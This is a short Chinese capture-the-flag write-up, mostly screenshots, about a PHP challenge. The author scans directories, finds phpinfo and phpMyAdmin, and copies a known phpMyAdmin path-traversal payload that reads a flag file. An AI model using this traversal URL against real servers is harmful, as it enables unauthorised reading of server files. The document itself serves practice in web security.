![](<./img/Pasted image 20221125210719.png>)

---
首页长这样

![](<./img/Pasted image 20221125210651.png>)

`dirsearch`扫到了`robots.txt`

![](<./img/Pasted image 20221125220315.png>)

![](<./img/Pasted image 20221125211153.png>)

访问`/phpinfo.php`

![](<./img/Pasted image 20221125211604.png>)

宁就是`webmaster`嘛www

既然他说和数据库有关，那就记一下叭（虽然不知道有什么用）

![](<./img/Pasted image 20221125211941.png>)

---
还有一个`phpmyadmin`扫到了，不知道是啥

![](<./img/Pasted image 20221125220518.png>)

emmm没有思路，看看版本号蛮可疑的

![](<./img/Pasted image 20221125220708.png>)

![](<./img/Pasted image 20221125221044.png>)

![](<./img/Pasted image 20221125221327.png>)

看不懂，但能抄.jpg（脚本小子实锤）

```php
/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../flag
```
![](<./img/Pasted image 20221125222248.png>)

#Web #PHP #目录扫描 #phpmyadmin #Vulnerabilities #信息检索